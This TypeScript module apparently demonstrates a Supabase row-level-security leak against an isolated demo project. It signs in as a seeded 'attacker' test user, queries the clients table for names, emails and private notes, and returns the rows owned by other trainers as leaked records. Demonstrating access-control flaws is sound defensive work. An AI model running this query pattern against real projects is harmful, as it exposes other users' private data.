export type LiveValidationErrorCode =
  | "SERVER_MISCONFIGURED"
  | "SIGN_IN_FAILED"
  | "QUERY_FAILED"
  | "TIMEOUT"
  | "NETWORK_ERROR"
  | "UNKNOWN";

export type LiveValidatedRow = {
  id: string;
  trainerId: string;
  name: string;
  email: string | null;
  privateNotes: string | null;
};

export type LiveValidationOutcome =
  | {
      ok: true;
      table: string;
      attackerEmail: string;
      attackerUserId: string;
      totalRowsReturned: number;
      ownRowCount: number;
      leakedRowCount: number;
      leakedRows: LiveValidatedRow[];
    }
  | { ok: false; error: LiveValidationErrorCode; message: string };

export type DemoSupabaseConfig = {
  url: string;
  anonKey: string;
  attackerEmail: string;
  attackerPassword: string;
};

const REQUEST_TIMEOUT_MS = 10_000;
const TABLE = "public.clients";

/** Reads and validates the server-only demo Supabase env vars, or returns null if any are missing. */
export function readDemoSupabaseConfig(): DemoSupabaseConfig | null {
  const url = process.env.DEMO_SUPABASE_URL;
  const anonKey = process.env.DEMO_SUPABASE_ANON_KEY;
  const attackerEmail = process.env.DEMO_ATTACKER_EMAIL;
  const attackerPassword = process.env.DEMO_ATTACKER_PASSWORD;

  if (!url || !anonKey || !attackerEmail || !attackerPassword) {
    return null;
  }
  return { url, anonKey, attackerEmail, attackerPassword };
}

async function withTimeout<T>(fn: (signal: AbortSignal) => Promise<T>): Promise<T> {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), REQUEST_TIMEOUT_MS);
  try {
    return await fn(controller.signal);
  } finally {
    clearTimeout(timeout);
  }
}

type RawClientRow = {
  id?: unknown;
  trainer_id?: unknown;
  name?: unknown;
  email?: unknown;
  private_notes?: unknown;
};

function normaliseRow(row: RawClientRow): LiveValidatedRow | null {
  if (typeof row.id !== "string" || typeof row.trainer_id !== "string" || typeof row.name !== "string") {
    return null;
  }
  return {
    id: row.id,
    trainerId: row.trainer_id,
    name: row.name,
    email: typeof row.email === "string" ? row.email : null,
    privateNotes: typeof row.private_notes === "string" ? row.private_notes : null,
  };
}

/**
 * Performs a real, live authenticated query against the isolated demo
 * Supabase project: signs in as the pre-seeded "attacker" test user through
 * a genuine password grant (no session is fabricated), then queries
 * public.clients exactly as the deployed vulnerable policy allows. Rows
 * belonging to other trainers in the response are the live proof of the
 * leak — nothing here is mocked, hardcoded, or reconstructed.
 */
export async function runLiveValidation(config: DemoSupabaseConfig): Promise<LiveValidationOutcome> {
  const { url, anonKey, attackerEmail, attackerPassword } = config;

  let tokenResponse: Response;
  try {
    tokenResponse = await withTimeout((signal) =>
      fetch(`${url}/auth/v1/token?grant_type=password`, {
        method: "POST",
        signal,
        headers: { apikey: anonKey, "Content-Type": "application/json" },
        body: JSON.stringify({ email: attackerEmail, password: attackerPassword }),
      }),
    );
  } catch (error) {
    if (error instanceof Error && error.name === "AbortError") {
      return { ok: false, error: "TIMEOUT", message: "Timed out signing in to the demo Supabase project." };
    }
    return { ok: false, error: "NETWORK_ERROR", message: "Unable to reach the demo Supabase project." };
  }

  let tokenBody: unknown;
  try {
    tokenBody = await tokenResponse.json();
  } catch {
    return { ok: false, error: "SIGN_IN_FAILED", message: "The demo Supabase project returned an invalid sign-in response." };
  }

  const accessToken =
    typeof tokenBody === "object" && tokenBody !== null && "access_token" in tokenBody
      ? (tokenBody as { access_token: unknown }).access_token
      : undefined;
  const userId =
    typeof tokenBody === "object" && tokenBody !== null && "user" in tokenBody
      ? ((tokenBody as { user?: { id?: unknown } }).user?.id)
      : undefined;

  if (!tokenResponse.ok || typeof accessToken !== "string" || typeof userId !== "string") {
    return {
      ok: false,
      error: "SIGN_IN_FAILED",
      message: "Could not sign in as the attacker test user. The demo environment may not be provisioned correctly.",
    };
  }

  let rowsResponse: Response;
  try {
    rowsResponse = await withTimeout((signal) =>
      fetch(`${url}/rest/v1/clients?select=id,trainer_id,name,email,private_notes`, {
        signal,
        headers: { apikey: anonKey, Authorization: `Bearer ${accessToken}` },
      }),
    );
  } catch (error) {
    if (error instanceof Error && error.name === "AbortError") {
      return { ok: false, error: "TIMEOUT", message: "Timed out querying the demo Supabase project." };
    }
    return { ok: false, error: "NETWORK_ERROR", message: "Unable to reach the demo Supabase project." };
  }

  if (!rowsResponse.ok) {
    return {
      ok: false,
      error: "QUERY_FAILED",
      message: `The live query against ${TABLE} failed with status ${rowsResponse.status}.`,
    };
  }

  let rawRows: unknown;
  try {
    rawRows = await rowsResponse.json();
  } catch {
    return { ok: false, error: "QUERY_FAILED", message: "The demo Supabase project returned an invalid query response." };
  }

  if (!Array.isArray(rawRows)) {
    return { ok: false, error: "QUERY_FAILED", message: "The demo Supabase project returned an unexpected response shape." };
  }

  const rows = rawRows.map((r) => normaliseRow(r as RawClientRow)).filter((r): r is LiveValidatedRow => r !== null);
  const ownRows = rows.filter((r) => r.trainerId === userId);
  const leakedRows = rows.filter((r) => r.trainerId !== userId);

  return {
    ok: true,
    table: TABLE,
    attackerEmail,
    attackerUserId: userId,
    totalRowsReturned: rows.length,
    ownRowCount: ownRows.length,
    leakedRowCount: leakedRows.length,
    leakedRows,
  };
}
